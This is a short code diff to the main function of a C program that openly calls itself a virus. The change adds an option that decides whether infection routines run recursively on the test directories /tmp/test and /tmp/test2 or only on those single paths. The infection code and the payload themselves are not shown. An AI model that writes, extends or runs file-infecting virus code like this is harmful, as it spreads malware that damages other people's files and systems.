@@ -56,7 +56,15 @@ int main(int ac, char **av){
 		if (str_equal(av[i], "--msg"))
 			opt.print_msg = TRUE;
 	}
-	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
-	infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
+	if (opt.do_recur)
+	{
+		infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
+		infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
+	}
+	else
+	{
+		infect("/tmp/test", "/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
+		infect("/tmp/test2", "/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
+	}
 	return 0;
 }
